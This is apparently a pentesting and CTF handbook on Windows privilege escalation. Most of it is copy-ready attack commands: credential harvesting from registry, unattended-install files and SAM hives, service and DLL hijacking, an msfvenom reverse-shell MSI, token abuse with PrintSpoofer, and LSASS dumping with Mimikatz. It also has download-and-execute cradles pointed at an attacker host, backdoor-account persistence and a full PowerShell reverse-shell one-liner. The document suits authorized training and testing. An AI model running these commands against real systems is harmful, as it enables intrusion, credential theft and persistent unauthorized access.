# 🪟 Windows Privilege Escalation Handbook

> A structured, methodology-driven reference for privilege escalation on Windows systems. Covers enumeration through post-exploitation across all major attack vectors. Companion to the Linux Privilege Escalation Handbook — same structure, same discipline.

---

## Table of Contents

1. [The Methodology](#the-methodology)
2. [Phase 1 — Enumeration](#phase-1--enumeration)
3. [Pillar 1 — Credential Access](#pillar-1--credential-access)
4. [Pillar 2 — Misconfigurations](#pillar-2--misconfigurations)
5. [Pillar 3 — Exploits](#pillar-3--exploits)
6. [File Transfer Methods](#file-transfer-methods)
7. [Post-Escalation](#post-escalation)
8. [Testing Checklist](#testing-checklist)
9. [Quick Reference](#quick-reference)

---

## The Methodology

Windows PrivEsc, like Linux, follows a decision tree rather than a checklist run blind. THM's Windows PrivEsc room (and OSCP methodology generally) divides the attack surface into the same **three pillars** used in the Linux handbook:

| Pillar | Description |
|--------|-------------|
| **Credential Access** | Find and reuse passwords, hashes, tokens, and saved secrets |
| **Misconfigurations** | Exploit weak service/registry/token permissions (most common path) |
| **Exploits** | Kernel/OS CVEs and vulnerable third-party software (last resort) |

> ⚠️ Windows PrivEsc is heavily **token and service-permission driven** — unlike Linux where SUID/cron dominate, on Windows you'll spend most of your time on service ACLs, registry keys, and privilege tokens (`SeImpersonate`, `SeBackup`, etc.).

### Attack Decision Flow

```
1. ENUMERATE   →  whoami /priv, whoami /groups, systeminfo, winPEAS
2. LOW FRUIT   →  saved creds, unattended install files, registry autologon
3. AUTO SCAN   →  winPEAS / PowerUp / Seatbelt to surface anomalies fast
4. TOKENS      →  check whoami /priv for SeImpersonate, SeBackup, SeDebug, etc.
5. MISCONFIGS  →  weak service perms, unquoted paths, AlwaysInstallElevated, scheduled tasks
6. EXPLOITS    →  OS build number → Watson / Sherlock (last resort)
```

---

## Phase 1 — Enumeration

### Identity & Environment

```cmd
whoami                          :: current user
whoami /priv                    :: enabled privileges — check for SeImpersonate, SeBackup, SeDebug, SeTakeOwnership
whoami /groups                  :: group memberships
whoami /all                     :: everything at once
net user                        :: list local users
net user <username>             :: details on a specific user
net localgroup administrators   :: who's in the local admins group
```

> 💡 `whoami /priv` is the single most important command on Windows. A `Disabled` privilege can often be enabled with `Enable-Privilege` from PowerUp or via token manipulation. Certain enabled privileges are an instant path to SYSTEM (see [2.6 Token Privileges](#26-token-privilege-abuse)).

### OS & Patch Level

```cmd
systeminfo                      :: full OS info, patch list, architecture
wmic qfe list                   :: installed hotfixes (KBs) — cross-reference against known CVEs
wmic os get osarchitecture      :: 32-bit vs 64-bit — critical for exploit compatibility
ver
```

```powershell
Get-ComputerInfo | select OsName, OsVersion, OsBuildNumber, OsArchitecture
Get-Hotfix | select HotfixID
```

> 💡 Save the full `systeminfo` output and run it through **Windows Exploit Suggester** or **Watson** on your attacker box — don't do version-hunting by hand.

### Network & Local Services

```cmd
ipconfig /all
netstat -ano                    :: connections + owning PID — cross-ref with tasklist
route print
arp -a
```

```powershell
Get-NetTCPConnection | Where-Object State -eq Listen
```

> 💡 Services bound to `127.0.0.1` only are often internal APIs or admin panels — worth port-forwarding and probing, especially if they run as SYSTEM.

### Running Processes & Installed Software

```cmd
tasklist /svc                   :: processes + associated services
wmic process list full
wmic product get name,version   :: installed software (slow, but useful) — check versions against CVEs
```

```powershell
Get-Process | Select-Object ProcessName, Id, Path
Get-CimInstance -ClassName Win32_Product | Select Name, Version
```

### Automated Enumeration

**winPEAS** (recommended — color-coded, most comprehensive, same family as LinPEAS):
```powershell
# Download and run (from attacker-hosted server)
IEX(New-Object Net.WebClient).DownloadString('http://[YOUR_IP]/winPEAS.ps1')

# Or transfer the .exe/.bat and run directly
.\winPEASx64.exe
```

**PowerUp.ps1** (PowerShell-native privesc checks):
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://[YOUR_IP]/PowerUp.ps1')
Invoke-AllChecks
```

**Seatbelt** (deep host survey, C# based):
```powershell
.\Seatbelt.exe -group=all
```

**PrivescCheck** (actively maintained, PowerUp successor):
```powershell
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
```

> ⚠️ Never rely solely on automated tools. winPEAS can miss context-specific vulnerabilities (custom services, third-party agents) — always follow up with manual checks, especially around token privileges.

---

## Pillar 1 — Credential Access

> Always try credential paths first. Windows scatters cleartext and recoverable credentials across the registry, config files, and scheduler far more than people expect.

### 1.1 Saved Credentials & Credential Manager

```cmd
cmdkey /list                    :: stored credentials on this host

:: If a saved cred exists, run a command as that user
runas /savecred /user:<DOMAIN>\<user> "cmd.exe /c whoami > C:\temp\out.txt"
```

> ⚠️ `cmdkey` credentials can't be extracted in cleartext, but `runas /savecred` will silently reuse the stored Windows Vault credential — this is a full "escape hatch" if a privileged account's creds are cached.

### 1.2 Unattended Installation Files

```cmd
:: Common locations for cleartext local-admin creds left after imaging/deployment
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep.inf
C:\Windows\System32\Sysprep\Sysprep.xml

type C:\Windows\Panther\Unattend.xml
```

> 💡 These files are generated by deployment tools (SCCM, MDT) and routinely left behind with a base64-encoded (trivially decodable) local administrator password.

### 1.3 Registry — Autologon & Stored Passwords

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: Look for DefaultUserName / DefaultPassword / DefaultDomainName

reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s      :: saved PuTTY sessions (proxy/host creds)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s   :: SNMP community strings
```

### 1.4 Config Files, Scripts & Application Data

```cmd
findstr /si password *.xml *.ini *.txt *.config 2>nul
findstr /spin "password" *.*                                 :: recursive search from current dir

dir /s /b *pass* *cred* *vnc* *.config
type C:\inetpub\wwwroot\web.config                            :: IIS connection strings
```

```powershell
Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt,*.config -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue
```

> 💡 Groups.xml from Group Policy Preferences (`SYSVOL\...\Groups\Groups.xml`) historically stored an encrypted `cpassword` — the AES key was published by Microsoft, so it decrypts instantly (`gpp-decrypt`). Deprecated since MS14-025 but still found on older/legacy domains.

### 1.5 PowerShell History & Transcripts

```powershell
(Get-PSReadlineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

> ⚠️ People paste credentials into PowerShell sessions constantly — this file is often the single fastest win on a box.

### 1.6 SAM / SYSTEM Hive Extraction

```cmd
:: Requires SeBackupPrivilege or local admin — copy the hives for offline cracking
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save
```

```bash
# On attacker box, extract hashes
secretsdump.py -sam sam.save -system system.save LOCAL
```

### 1.7 Browser & WiFi Credentials

```cmd
netsh wlan show profile
netsh wlan show profile name="<SSID>" key=clear             :: recover saved WiFi password
```

> 💡 Browser-saved passwords (Chrome/Edge Login Data SQLite DBs) require decrypting with `DPAPI` — tools like **SharpChrome** or **LaZagne** automate this.

---

## Pillar 2 — Misconfigurations

> Misconfigurations are the most common path to SYSTEM on Windows. Exhaustively check services, registry, tasks, and tokens before moving to exploits.

### 2.1 Weak Service Permissions

```cmd
:: List services and check ACLs with accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv <username> *

sc qc <servicename>              :: query service config (binary path, start type, account)
sc query state= all              :: enumerate all services
```

**If you have `SERVICE_CHANGE_CONFIG` on a service running as SYSTEM:**
```cmd
sc config <servicename> binpath= "C:\temp\shell.exe"
sc stop <servicename>
sc start <servicename>
```

### 2.2 Unquoted Service Paths

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**When it works:** a service binary path like `C:\Program Files\My App\service.exe` (no quotes) lets Windows try each space-delimited segment as an executable — `C:\Program.exe`, then `C:\Program Files\My.exe`, etc.

```cmd
:: If C:\Program Files\ is writable, drop a payload named to match a path segment
copy shell.exe "C:\Program Files\My.exe"
sc stop <servicename> & sc start <servicename>
```

> 💡 Check with `icacls "C:\Program Files\"` (or whichever parent dir) to confirm you actually have write access before assuming this is exploitable.

### 2.3 Weak Folder/File Permissions on Service Binaries

```cmd
icacls "C:\Program Files\VulnService\service.exe"
```

If `(F)` (Full Control) or `(M)` (Modify) is granted to `Everyone`, `Users`, or your current user — replace the binary directly with a payload and restart the service (same technique as 2.1).

### 2.4 DLL Hijacking

```cmd
:: Identify DLLs a privileged process attempts to load from a writable/missing path
:: (use Process Monitor with filter: Result = NAME NOT FOUND, Path ends with .dll)
```

```powershell
# PowerUp check
Find-PathDLLHijack
Find-ServiceDLLHijack
```

> 💡 If a SYSTEM-run service or scheduled task loads a DLL from a directory you can write to (or that's missing entirely), drop a malicious DLL matching the expected name and exported functions — it executes with the caller's privileges on next load.

### 2.5 AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
:: Both must show AlwaysInstallElevated = 1
```

**Exploitation — build a malicious MSI and install it (runs as SYSTEM):**
```bash
# On attacker box (msfvenom)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f msi -o shell.msi
```
```cmd
msiexec /quiet /qn /i C:\temp\shell.msi
```

### 2.6 Token Privilege Abuse

`whoami /priv` is your map here. Enabled-but-often-overlooked privileges that lead straight to SYSTEM:

| Privilege | Exploitation Path |
|-----------|-------------------|
| `SeImpersonatePrivilege` | Potato family (PrintSpoofer, JuicyPotato, RoguePotato, GodPotato) → SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Same Potato family exploits apply |
| `SeBackupPrivilege` | Read any file regardless of ACL (incl. SAM/SYSTEM hives) → offline hash extraction |
| `SeRestorePrivilege` | Write any file regardless of ACL — overwrite service binaries or `sethc.exe` for sticky-keys backdoor |
| `SeTakeOwnershipPrivilege` | `takeown /f <file>` on any protected file, then grant yourself access |
| `SeDebugPrivilege` | Open a handle to any process (incl. SYSTEM ones) — used by Mimikatz to dump LSASS |
| `SeLoadDriverPrivilege` | Load a malicious/vulnerable kernel driver for code execution as SYSTEM |

**SeImpersonate / SeAssignPrimaryToken → PrintSpoofer (modern, most reliable on patched hosts):**
```cmd
PrintSpoofer64.exe -i -c cmd.exe
```

**SeBackup/SeRestore → dump hives, then extract offline:**
```cmd
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
```
```bash
secretsdump.py -sam sam.save -system system.save LOCAL
```

**SeDebug → dump LSASS with Mimikatz:**
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

> ⚠️ JuicyPotato stopped working on builds ≥ 1809 due to a CLSID/DCOM fix. **PrintSpoofer** and **RoguePotato** are the current go-tos; **GodPotato** covers the widest build range as of 2023+.

### 2.7 Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

Look for tasks that run as SYSTEM/admin and either (a) execute a script/binary you can write to, or (b) run on a predictable interval you can catch with Process Monitor.

### 2.8 AutoRuns & Startup Applications

```cmd
wmic startup get caption,command
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

If a startup entry points to a writable path, replace it — it executes on next login of that user (or on boot, for HKLM entries).

### 2.9 Insecure GUI Apps Running as Admin

If an admin-run GUI application is reachable via RDP/screen-share (e.g. left open), abuse its "Open File" / "Save As" dialog to spawn `cmd.exe` via the address bar (`file explorer` navigation trick) — classic in CTF/THM boxes, less common in real engagements but worth checking.

---

## Pillar 3 — Exploits

> ⚠️ Use exploits as a last resort. Kernel exploits can BSOD the target, and unpatched-CVE hunting is noisy. Always exhaust credential and misconfiguration paths first.

### 3.1 Kernel / OS Exploits

```cmd
systeminfo                       :: capture full patch level first
```

```bash
# On attacker box — feed systeminfo output in
python3 windows-exploit-suggester.py --update
python3 windows-exploit-suggester.py --database <db.xls> --systeminfo systeminfo.txt

# Or Watson (run on target, C#/compiled)
Watson.exe
```

**Notable Windows privesc CVEs:**

| CVE | Name | Affected | Impact |
|-----|------|----------|--------|
| CVE-2021-34527 | PrintNightmare | Print Spooler, most builds | SYSTEM |
| CVE-2020-1472 | Zerologon | Domain Controllers | Domain Admin |
| CVE-2021-1732 | Win32k EoP | Windows 10 pre-patch | SYSTEM |
| CVE-2019-0841 | AppXSvc EoP | Windows 10 | SYSTEM |
| CVE-2018-8453 | Win32k EoP | Windows 7–10 | SYSTEM |
| CVE-2017-0213 | COM Aggregate Marshaler | Windows 7–10 | SYSTEM |
| MS16-032 | Secondary Logon Handle | Windows 7/8/2008/2012 | SYSTEM |
| MS10-015 | KiTrap0D | Windows XP/2003/2008/7 (old) | SYSTEM |

> 💡 Kernel exploits are usually compiled C/PowerShell PoCs from GitHub (e.g. `SharpKernelExploits` bundles several MSF-independent PoCs). Always test in a matching VM/build before firing at a live target.

### 3.2 Vulnerable Third-Party Software

```cmd
wmic product get name,version
```

Cross-reference every installed product/version against Exploit-DB and vendor advisories — third-party services running as SYSTEM (backup agents, monitoring agents, old FTP/DB servers) are frequently the actual foothold-to-SYSTEM path, not the OS kernel itself.

---

## File Transfer Methods

### Attacker → Target

```powershell
# PowerShell download (most common)
IEX(New-Object Net.WebClient).DownloadString('http://[YOUR_IP]/script.ps1')
(New-Object Net.WebClient).DownloadFile('http://[YOUR_IP]/file.exe', 'C:\temp\file.exe')

# PowerShell 3+ alternative
Invoke-WebRequest -Uri http://[YOUR_IP]/file.exe -OutFile C:\temp\file.exe
```

```cmd
:: certutil (LOLBAS — no PowerShell needed, blends in as admin tooling)
certutil -urlcache -split -f http://[YOUR_IP]/file.exe C:\temp\file.exe
```

```cmd
:: SMB share from attacker (Impacket smbserver.py)
copy \\[YOUR_IP]\share\file.exe C:\temp\file.exe
```

```bash
# Attacker side: quick HTTP server
python3 -m http.server 8080

# Attacker side: quick SMB server (Impacket)
smbserver.py share $(pwd) -smb2support
```

### Base64 (no network needed)

```powershell
# Attacker: encode
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.exe")) | Out-File encoded.txt

# Target: decode
[IO.File]::WriteAllBytes("C:\temp\file.exe", [Convert]::FromBase64String("[BASE64_STRING]"))
```

---

## Post-Escalation

```cmd
whoami                                          :: verify SYSTEM/administrator
type C:\Users\Administrator\Desktop\flag.txt    :: grab the flag
```

```cmd
:: Dump hashes for offline cracking / lateral movement
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

```bash
# Remote hash dump (post-exploitation from attacker box, given admin creds)
secretsdump.py <domain>/<user>:<pass>@<target_ip>
```

```cmd
:: Persistence — add a local admin user
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add

:: Persistence — RDP enable
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

> 📝 Document the exact PrivEsc path taken — which pillar, which specific misconfig/credential/exploit — you'll need it for your report or write-up.

---

## Testing Checklist

Use this checklist for every target. Work top to bottom — don't jump to exploits before exhausting misconfigs.

### Phase 1 — Enumeration
- [ ] Run `whoami`, `whoami /priv`, `whoami /groups`
- [ ] Get OS/patch level: `systeminfo`, `wmic qfe list`
- [ ] Confirm architecture (x86 vs x64) before selecting payloads/exploits
- [ ] Enumerate local users and admin group membership
- [ ] Run winPEAS / PowerUp / PrivescCheck and review flagged items
- [ ] Enumerate local services: `netstat -ano`, `tasklist /svc`
- [ ] List installed software and cross-reference for known CVEs

### Phase 2 — Credential Access
- [ ] Check `cmdkey /list` and try `runas /savecred`
- [ ] Search for `Unattend.xml` / `Sysprep.xml` / `Sysprep.inf`
- [ ] Check registry for Winlogon autologon creds and PuTTY sessions
- [ ] `findstr /si password` across common config/script locations
- [ ] Check PowerShell history (`ConsoleHost_history.txt`)
- [ ] If `SeBackupPrivilege` available — dump SAM/SYSTEM hives
- [ ] Check saved WiFi profiles: `netsh wlan show profile ... key=clear`

### Phase 3 — Misconfigurations
- [ ] Service permissions: `accesschk` / `sc qc` on every service — check against writable binpath
- [ ] Unquoted service paths: `wmic service get ... | findstr /i /v "C:\Windows\\"`
- [ ] File/folder ACLs on service binaries: `icacls`
- [ ] DLL hijack candidates via PowerUp / Process Monitor
- [ ] `AlwaysInstallElevated` registry keys (both HKCU and HKLM)
- [ ] Review every enabled privilege in `whoami /priv` against the token abuse table
- [ ] Scheduled tasks running as SYSTEM/admin with writable targets
- [ ] AutoRuns / Run keys pointing to writable paths

### Phase 4 — Exploits (last resort)
- [ ] Run Windows Exploit Suggester / Watson against captured `systeminfo`
- [ ] Check Print Spooler service status (PrintNightmare)
- [ ] Check for MS16-032 applicability (older builds)
- [ ] Cross-reference installed third-party software versions with Exploit-DB
- [ ] Verify exploit compatibility with target build/architecture before running

### Phase 5 — Post-Escalation
- [ ] Verify elevated context: `whoami`
- [ ] Grab flag / target objective
- [ ] Dump credentials (Mimikatz / secretsdump) for lateral movement
- [ ] Enumerate domain trusts / additional subnets if domain-joined
- [ ] Document the full PrivEsc path

---

## Quick Reference

### Useful One-Liners

```cmd
:: Find writable directories in PATH (useful for hijacking)
for %i in (%PATH:;= %) do ( icacls "%i" 2>nul | findstr /i "(F) (M) (W)" )

:: Find all files modified in the last 10 minutes
forfiles /p C:\ /s /m *.* /d 0 /c "cmd /c echo @path"

:: Spawn a reverse shell (already have execution, need a callback)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('[YOUR_IP]',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

### Essential Resources

| Resource | URL |
|----------|-----|
| LOLBAS (Windows GTFOBins equivalent) | https://lolbas-project.github.io |
| winPEAS | https://github.com/carlospolop/PEASS-ng |
| PowerUp / PowerSploit | https://github.com/PowerShellMafia/PowerSploit |
| PrivescCheck | https://github.com/itm4n/PrivescCheck |
| Watson | https://github.com/rasta-mouse/Watson |
| Windows Exploit Suggester | https://github.com/AonCyberLabs/Windows-Exploit-Suggester |
| PrintSpoofer | https://github.com/itm4n/PrintSpoofer |
| GodPotato | https://github.com/BeichenDream/GodPotato |
| Mimikatz | https://github.com/gentilkiwi/mimikatz |
| Impacket (secretsdump, smbserver) | https://github.com/fortra/impacket |

---

## General References

| Resource | URL |
|----------|-----|
| TryHackMe: Windows Privilege Escalation | https://tryhackme.com/room/windowsprivesc20 |
| PayloadsAllTheThings: Windows PrivEsc | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md |
| HackTricks: Windows Local Privilege Escalation | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html |
| Conda: OSCP Methodology | https://www.youtube.com/watch?v=VpNaPAh93vE |

---

*Handbook covers OSCP methodology, HTB, and real-world pentesting. Always operate within scope and with proper authorization.*